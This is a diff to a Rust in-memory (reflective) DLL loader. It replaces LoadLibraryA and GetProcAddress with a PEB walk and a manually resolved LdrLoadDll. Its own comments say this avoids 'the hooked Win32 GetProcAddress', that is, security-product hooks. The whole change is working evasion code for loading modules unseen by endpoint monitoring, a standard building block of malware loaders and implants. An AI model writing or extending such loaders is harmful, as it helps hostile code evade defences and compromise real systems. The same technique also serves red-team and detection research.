@@ -4,9 +4,9 @@
 use anyhow::{anyhow, Result};
 use goblin::pe::PE;
 use std::collections::HashMap;
-use std::ffi::{c_void, CString};
+// Use winapi's c_void throughout to avoid type mismatches with winapi return values.
+use winapi::ctypes::c_void;
 use winapi::shared::ntdef::{LIST_ENTRY, UNICODE_STRING};
-use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
 use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
 use winapi::um::winnt::{
     DLL_PROCESS_ATTACH, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT,
@@ -69,6 +69,35 @@ struct LDR_DATA_TABLE_ENTRY {
     SizeOfImage: u32,
     FullDllName: UNICODE_STRING,
     BaseDllName: UNICODE_STRING,
+}
+
+/// Load a module using LdrLoadDll resolved via PEB walk — avoids LoadLibraryA.
+unsafe fn load_via_ldr(module_name: &str) -> *mut c_void {
+    // Resolve LdrLoadDll from the already-loaded ntdll via PEB walk.
+    let ntdll = get_module_handle_peb("ntdll.dll");
+    if ntdll.is_null() { return std::ptr::null_mut(); }
+    let ldr_load_dll_ptr = get_proc_address_manual(ntdll, "LdrLoadDll");
+    if ldr_load_dll_ptr.is_null() { return std::ptr::null_mut(); }
+
+    type LdrLoadDllFn = unsafe extern "system" fn(
+        search_path: *const u16,
+        dll_characteristics: *const u32,
+        module_name: *const winapi::shared::ntdef::UNICODE_STRING,
+        base_address: *mut *mut c_void,
+    ) -> i32;
+    let ldr_load_dll: LdrLoadDllFn = std::mem::transmute(ldr_load_dll_ptr);
+
+    // Build a UNICODE_STRING for the module name.
+    let mut wide: Vec<u16> = module_name.encode_utf16().chain(std::iter::once(0)).collect();
+    let mut us = winapi::shared::ntdef::UNICODE_STRING {
+        Length: ((wide.len() - 1) * 2) as u16,
+        MaximumLength: (wide.len() * 2) as u16,
+        Buffer: wide.as_mut_ptr(),
+    };
+
+    let mut base: *mut c_void = std::ptr::null_mut();
+    let status = ldr_load_dll(std::ptr::null(), std::ptr::null(), &us, &mut base);
+    if status < 0 { std::ptr::null_mut() } else { base }
 }
 
 unsafe fn get_module_handle_peb(module_name: &str) -> *mut c_void {
@@ -146,9 +175,7 @@ unsafe fn get_proc_address_manual(module: *mut c_void, proc_name: &str) -> *mut 
     let export_dir_size =
         nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].Size;
     if export_dir_rva == 0 {
-        if let Ok(cname) = CString::new(proc_name) {
-            return GetProcAddress(module as _, cname.as_ptr() as _) as *mut c_void;
-        }
+        // No export directory — cannot resolve this function manually.
         return std::ptr::null_mut();
     }
 
@@ -192,12 +219,10 @@ unsafe fn get_proc_address_manual(module: *mut c_void, proc_name: &str) -> *mut 
                             if let Some(dot) = fwd_str.find('.') {
                                 let target_mod = &fwd_str[..dot];
                                 let target_fn = &fwd_str[dot + 1..];
-                                // Try PEB walk first, then LoadLibrary.
+                                // Try PEB walk first, then fall back to a ntdll-direct load.
                                 let mut mod_handle = get_module_handle_peb(target_mod);
                                 if mod_handle.is_null() {
-                                    let mod_name = format!("{}\0", target_mod);
-                                    mod_handle =
-                                        LoadLibraryA(mod_name.as_ptr() as _) as *mut c_void;
+                                    mod_handle = load_via_ldr(target_mod);
                                 }
                                 if !mod_handle.is_null() {
                                     return get_proc_address_manual(mod_handle, target_fn);
@@ -212,9 +237,8 @@ unsafe fn get_proc_address_manual(module: *mut c_void, proc_name: &str) -> *mut 
         }
     }
 
-    if let Ok(cname) = CString::new(proc_name) {
-        return GetProcAddress(module as _, cname.as_ptr() as _) as *mut c_void;
-    }
+    // Function not found in the export table — return null rather than
+    // calling the hooked Win32 GetProcAddress.
     std::ptr::null_mut()
 }
 
@@ -286,9 +310,7 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
         if !loaded_modules.contains_key(dll_name) {
             let mut handle = get_module_handle_peb(dll_name);
             if handle.is_null() {
-                if let Ok(cname) = CString::new(dll_name) {
-                    handle = LoadLibraryA(cname.as_ptr()) as *mut c_void;
-                }
+                handle = load_via_ldr(dll_name);
                 if handle.is_null() {
                     return Err(anyhow!("Failed to load dependent module {}", dll_name));
                 }
